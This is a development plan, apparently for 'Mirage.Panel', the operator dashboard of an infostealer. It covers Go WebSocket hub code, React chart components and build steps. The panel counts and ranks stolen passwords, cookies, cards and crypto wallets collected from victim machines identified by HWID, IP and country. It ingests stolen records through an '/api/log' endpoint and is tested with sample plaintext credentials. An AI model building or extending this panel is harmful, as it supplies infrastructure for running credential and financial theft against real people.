# Phase 1: Dashboard & Live Data — Execution Plan

**Цель:** Полноценный дашборд с живыми данными, WebSocket push, 3 вида графиков, таблица топ доменов.  
**Оценка:** 3 дня | **Версии:** Go 1.25.6, gorilla/websocket v1.5.3, React 19.2.7, Recharts 3.3.0  
**Подготовлено:** 2026-07-02 | **Статус:** ⬜ Not started

**Зависимости от Phase 0:** ✅ Go backend, SQLite, JWT auth, Login page, Dashboard stub — готово

---

## Исследование (Research Results)

### 1. gorilla/websocket Hub Pattern
Оригинальный chat example (gorilla/websocket) использует архитектуру:
- **Hub** — центральный диспетчер: каналы `register`, `unregister`, `broadcast`, карта `clients map[*Client]bool`
- **Client** — обёртка соединения: `conn *websocket.Conn`, `send chan []byte`, методы `readPump()` / `writePump()`
- **readPump** — читает сообщения от клиента, отправляет в hub.broadcast
- **writePump** — слушает `client.send`, пишет в websocket, отправляет Ping каждые 54s
- **Upgrader** — `websocket.Upgrader` с ReadBufferSize/WriteBufferSize

**Адаптация для панели:**
- Hub не принимает сообщения от клиентов (только server → client broadcast)
- readPump только обрабатывает pong и закрытие
- writePump отправляет JSON-сообщения со статистикой
- Аутентификация через JWT в query-параметре `?token=`

### 2. Результаты аудита (из обсуждения)
См. `docs/code-audit-report.md` — в Phase 0 багов не найдено, все тесты проходят.

---

## Day 1: Go Backend — WebSocket Hub + Stats API

### 1.1 `internal/ws/hub.go` — WebSocket hub

```go
package ws

type Hub struct {
    clients    map[*Client]bool
    broadcast  chan []byte
    register   chan *Client
    unregister chan *Client
}

func NewHub() *Hub
func (h *Hub) Run()   // основной цикл: register/unregister/broadcast
```

```go
type Client struct {
    hub  *Hub
    conn *websocket.Conn
    send chan []byte
    user string   // username из JWT
}

const (
    writeWait  = 10 * time.Second
    pongWait   = 60 * time.Second
    pingPeriod = (pongWait * 9) / 10
    maxMsgSize = 4096
)
```

- `Client.readPump()` — читает pong, закрытие
- `Client.writePump()` — слушает `send`, пишет JSON, отправляет Ping
- `Hub.Broadcast(message []byte)` — отправляет всем клиентам
- `ServeWs(hub *Hub, db *sql.DB, jwtSecret string)` — HTTP handler:
  1. Проверяет JWT из query-параметра `?token=`
  2. Upgrade HTTP → WebSocket
  3. Создаёт Client, регистрирует в hub
  4. Запускает `go client.writePump()` и `go client.readPump()`

### 1.2 `internal/ws/events.go` — Типы событий

```go
// Все события WebSocket — JSON с полем "type"

type StatsUpdate struct {
    Type  string       `json:"type"` // "stats_update"
    Data  StatsPayload `json:"data"`
}

type NewSessionEvent struct {
    Type string       `json:"type"` // "new_session"
    Data SessionBrief `json:"data"`
}

type StatsPayload struct {
    SessionsTotal  int `json:"sessions_total"`
    SessionsToday  int `json:"sessions_today"`
    PasswordsTotal int `json:"passwords_total"`
}

type SessionBrief struct {
    ID             string `json:"id"`
    CountryCode    string `json:"country_code"`
    PasswordsCount int    `json:"passwords_count"`
}
```

### 1.3 `internal/api/stats.go` — Дополнение (уже есть MVP)

Обновить существующий `StatsHandler.Dashboard`:
- ✅ Все 7 секций уже реализованы (sessions, passwords, cookies, cards, wallets, geo, browsers, timeline, top_domains)
- ✅ NULL-safe запросы через COALESCE
- ✅ Правильные индексы в БД

**Нужно добавить:**
- После запроса статистики — публикация события в WebSocket hub (если hub передан)
- Интегрировать хендлер с hub

**Дополнительный хендлер: GET /api/stats/live** — возвращает те же данные + timestamp. Разница от обычного /api/stats: минимальная.

### 1.4 `cmd/panel/main.go` — Интеграция WebSocket

Подключить WebSocket hub в main.go:

```go
// Создать hub
wsHub := ws.NewHub()
go wsHub.Run()

// В chi router добавить:
r.Get("/ws", ws.ServeWs(wsHub, db, jwtSecret))

// Передать hub в API для broadcast обновлений
statsHandler := api.NewStatsHandler(db, wsHub)
```

**Важно:** WebSocket endpoint НЕ проходит через auth middleware (JWT проверяется внутри ServeWs с query-параметром `?token=`). Путь `/ws` нужно добавить в `skipPaths`.

**Vite proxy:** Уже настроен в `vite.config.ts`:
```ts
'/ws': { target: 'ws://localhost:8080', ws: true },
```

### 1.5 `internal/api/stats_test.go` — Добавить тесты

- TestStats_WithWebSocketHub — передаём mock hub, проверяем что broadcast вызван
- TestStats_ConcurrentAccess — 10 параллельных запросов, нет race

### 1.6 Тесты

```bash
go test ./internal/ws/... -v -count=1          # WebSocket hub unit tests
go test ./internal/api/... -v -count=1          # Stats + WS integration
go test -race ./internal/... -count=1           # Race check
```

---

## Day 2: Frontend — Dashboard с живыми данными

### 2.1 `web/src/pages/Dashboard.tsx` — Полный дашборд

**Обновить существующий Dashboard.tsx (Phase 0 stub):**

```
┌────────────────────────────────────────────────────────────┐
│  Dashboard                                                  │
│  ┌──────────┬──────────┬──────────┬──────────┐             │
│  │ 1,284    │ 12,453   │ 32,451   │ 893      │             │
│  │ Sessions │Passwords │ Cookies  │ Cards    │             │
│  │ ▲ +47 today         │          │          │             │
│  └──────────┴──────────┴──────────┴──────────┘             │
│                                                             │
│  ┌──────────────────────────────────────────┐               │
│  │  Sessions — Last 30 Days                 │               │
│  │  ▁▂▃▅▇▆▄▃▂▁▃▅▇▆▄▃▂                         │               │
│  │  AreaChart (Recharts)                    │               │
│  │  • gradient fill accent/20 → transparent  │               │
│  │  • stroke accent, strokeWidth={2}        │               │
│  │  • custom tooltip с датой и count         │               │
│  └──────────────────────────────────────────┘               │
│                                                             │
│  ┌──────────────────────────┬──────────────────────────────┐│
│  │  Geo Distribution        │  Browser Distribution        ││
│  │  horizontal BarChart     │  PieChart (donut)            ││
│  │  🇷🇺 RU ██████████ 456   │  Chrome   68%  ████████████ ││
│  │  🇺🇸 US ████████░░ 324   │  Edge     18%  █████░░░░░░ ││
│  │  🇩🇪 DE ██████░░░░ 189   │  Firefox  10%  ███░░░░░░░░ ││
│  │  🇬🇧 GB ████░░░░░░ 123   │  Opera     4%  █░░░░░░░░░░ ││
│  └──────────────────────────┴──────────────────────────────┘│
│                                                             │
│  ┌──────────────────────────────────────────┐               │
│  │  Top 10 Domains (by password count)     │               │
│  │  ┌─────────────┬──────────┬──────────┐  │               │
│  │  │ google.com  │    452   │  12.3%   │  │               │
│  │  │ facebook... │    321   │   8.7%   │  │               │
│  │  └─────────────┴──────────┴──────────┘  │               │
│  └──────────────────────────────────────────┘               │
└────────────────────────────────────────────────────────────┘
```

**Компоненты графиков (отдельные файлы):**

### 2.2 `web/src/components/charts/timeline.tsx`
```tsx
interface TimelineProps {
  data: Array<{ date: string; count: number }>
  isLoading: boolean
}

// Recharts AreaChart, dark theme colors
// XAxis: date (every 5th tick formatted)
// YAxis: count
// Tooltip: custom with date + count
// Loading: Skeleton (h-[300px])
// Empty: "No data yet — waiting for first log"
```

### 2.3 `web/src/components/charts/geo-bar.tsx`
```tsx
interface GeoBarProps {
  data: Array<{ country: string; count: number }>
  isLoading: boolean
}

// Recharts BarChart, horizontal layout="vertical"
// Each bar: flag emoji + country code + count
// Bars colored with accent shade based on count
// Loading: Skeleton
// Empty: "No geo data yet"
```

### 2.4 `web/src/components/charts/browser-pie.tsx`
```tsx
interface BrowserPieProps {
  data: Array<{ name: string; count: number }>
  isLoading: boolean
}

// Recharts PieChart, donut variant (innerRadius="60%")
// Custom label: name + percentage
// Hover tooltip: name + count
// Colors: palette for top 4, grey for rest
// Loading: Skeleton
// Empty: "No browser data yet"
```

### 2.5 `web/src/components/charts/stat-card.tsx`
```tsx
interface StatCardProps {
  title: string
  value: number
  subtitle?: string     // "+47 today"
  icon: LucideIcon      // lucide-react icon
  trend?: { value: number; positive: boolean }
  isLoading: boolean
}

// shadcn/ui Card + CardHeader + CardContent
// Large number (text-2xl font-bold tabular-nums)
// Subtitle in muted text
// Skeleton when loading
```

### 2.6 `web/src/lib/ws.ts` — Обновить для реального использования

```ts
type WSEvent = 
  | { type: 'stats_update'; data: StatsPayload }
  | { type: 'new_session'; data: SessionBrief }
  | { type: 'pong' }

class WSClient {
  private ws: WebSocket | null = null
  private reconnectAttempts = 0
  private maxReconnect = 5
  private listeners: Map<string, Set<(data: any) => void>> = new Map()
  private token: string | null = null

  connect(token: string) { /* ... */ }
  disconnect() { /* ... */ }
  on(type: string, cb: (data: any) => void) { /* subscribe */ }
  off(type: string, cb: (data: any) => void) { /* unsubscribe */ }
  
  private handleMessage(event: MessageEvent) {
    const msg = JSON.parse(event.data) as WSEvent
    const listeners = this.listeners.get(msg.type)
    if (listeners) listeners.forEach(cb => cb(msg.data))
  }
}
```

### 2.7 `web/src/App.tsx` — Подключить WebSocket

После успешного логина:
```tsx
// В AuthProvider или ProtectedRoute:
useEffect(() => {
  const token = localStorage.getItem('token')
  if (token) wsClient.connect(token)
  return () => wsClient.disconnect()
}, [isAuthenticated])
```

### 2.8 `web/src/hooks/use-dashboard.ts` — Hook для данных дашборда

```ts
import { useQuery, useQueryClient } from '@tanstack/react-query'
import { useEffect } from 'react'
import { api } from '@/lib/api'
import { wsClient } from '@/lib/ws'
import type { StatsResponse } from '@/types'

export function useDashboard() {
  const queryClient = useQueryClient()

  const query = useQuery<StatsResponse>({
    queryKey: ['stats'],
    queryFn: () => api.get<StatsResponse>('/api/stats'),
    refetchInterval: 10_000,  // fallback polling
  })

  // Live updates via WebSocket
  useEffect(() => {
    const handler = (data: any) => {
      queryClient.invalidateQueries({ queryKey: ['stats'] })
    }
    wsClient.on('stats_update', handler)
    wsClient.on('new_session', handler)
    return () => {
      wsClient.off('stats_update', handler)
      wsClient.off('new_session', handler)
    }
  }, [queryClient])

  return query
}
```

### 2.9 Top Domains Table

Добавить в Dashboard таблицу топ-10 доменов с использованием shadcn/ui Table:
```
Top 10 Password Domains
┌─────────────────┬──────────┬──────────┐
│ Domain          │ Count    │ %        │
├─────────────────┼──────────┼──────────┤
│ google.com      │ 452      │ 12.3%    │
│ facebook.com    │ 321      │  8.7%    │
│ github.com      │ 234      │  6.4%    │
└─────────────────┴──────────┴──────────┘
```

---

## Day 3: Integration & Polish

### 3.1 WebSocket в Vite dev proxy

Проверить что `vite.config.ts` корректно проксирует WebSocket:

```ts
server: {
  proxy: {
    '/api': { target: 'http://localhost:8080', changeOrigin: true },
    '/ws':  { target: 'ws://localhost:8080', ws: true },
  },
}
```

**Важно:** Для WebSocket proxy нужно установить `ws: true` — это включено.

### 3.2 Production сборка

```bash
# Frontend → dist/
cd web && npm run build

# Copy to Go embed path
rm -rf ../cmd/panel/frontend/dist
cp -r dist ../cmd/panel/frontend/dist

# Build binary
cd .. && go build -o bin/mirage-panel ./cmd/panel

# Verify
./bin/mirage-panel
# → Go to http://localhost:8080, login, see Dashboard with live data
```

### 3.3 Тестирование Dashboard

| Тест | Что проверяет |
|------|---------------|
| Stat cards отображают числа | Данные из /api/stats |
| Timeline chart рендерится | Recharts AreaChart с данными |
| Geo chart рендерится | Recharts BarChart horizontal |
| Browser pie рендерится | Recharts PieChart donut |
| Loading skeletons | Пока данные грузятся |
| Empty state | Когда данных нет |
| WS обновление | После WS "stats_update" query invalidate |
| Polling fallback | Если WS отключён, react-query refetchInterval |

### 3.4 Интеграционный тест

```bash
# Terminal 1: Start backend
cd Mirage.Panel && go run ./cmd/panel

# Terminal 2: Start frontend dev
cd Mirage.Panel/web && npm run dev

# Open http://localhost:5173
# Login: admin / admin
# Dashboard should show zeros (empty DB)

# Terminal 3: Insert test data
sqlite3 data/mirage.db "
INSERT INTO sessions (id, hwid, os, ip, country_code, created_at)
VALUES ('test1', 'HWID1', 'Windows 11', '85.26.134.55', 'RU', datetime('now'));
INSERT INTO passwords (id, session_id, url, username, password_value, browser)
VALUES ('p1', 'test1', 'https://google.com', 'user@gmail.com', 'secret123', 'Chrome');
INSERT INTO passwords (id, session_id, url, username, password_value, browser)
VALUES ('p2', 'test1', 'https://facebook.com', 'user', 'pass456', 'Chrome');
INSERT INTO cookies (id, session_id, domain, name, value)
VALUES ('c1', 'test1', '.google.com', 'session', 'abc123');
"

# Reload Dashboard → see updated stats
```

### 3.5 Go тесты

```bash
go test ./internal/... -v -count=1      # 37+ tests
go test -race ./internal/... -count=1   # race-free
```

---

## Deliverables Phase 1

```
✅ WebSocket hub (Go) — broadcast + JWT auth
✅ WebSocket endpoint /ws — upgrade + readPump/writePump
✅ Stats broadcast — после каждого /api/log (заглушка, будет в Phase 4)
✅ Dashboard — 4 stat cards с live-данными
✅ Timeline AreaChart (30 days)
✅ Geo Distribution BarChart (horizontal, флаги)
✅ Browser Distribution PieChart (donut)
✅ Top 10 Domains Table
✅ Loading skeletons для всех компонентов
✅ Empty states для всех компонентов
✅ WebSocket reconnect (max 5 попыток)
✅ Fallback polling (10s, react-query refetchInterval)
✅ WS proxy в Vite dev
✅ Production сборка
✅ Go tests: web socket hub unit tests + race check
```

---

## Файлы для создания/изменения

| Файл | Действие | Что меняем |
|------|----------|------------|
| `internal/ws/hub.go` | 🆕 | Hub + Run() |
| `internal/ws/events.go` | 🆕 | Event types (StatsUpdate, NewSessionEvent) |
| `internal/ws/client.go` | 🆕 | Client + readPump/writePump |
| `internal/ws/ws_test.go` | 🆕 | Hub unit tests |
| `internal/ws/ws_handler.go` | 🆕 | ServeWs HTTP handler |
| `internal/api/stats.go` | ✏️ | Добавить broadcast после запроса |
| `cmd/panel/main.go` | ✏️ | Подключить WS hub, передать в API |
| `web/src/App.tsx` | ✏️ | Подключить WS при логине |
| `web/src/hooks/use-dashboard.ts` | 🆕 | Hook с query + WS invalidation |
| `web/src/components/charts/timeline.tsx` | 🆕 | AreaChart |
| `web/src/components/charts/geo-bar.tsx` | 🆕 | BarChart geo |
| `web/src/components/charts/browser-pie.tsx` | 🆕 | PieChart browser |
| `web/src/components/charts/stat-card.tsx` | 🆕 | Stat card component |
| `web/src/lib/ws.ts` | ✏️ | Полноценный WS client |
| `web/src/pages/Dashboard.tsx` | ✏️ | Полный дашборд |
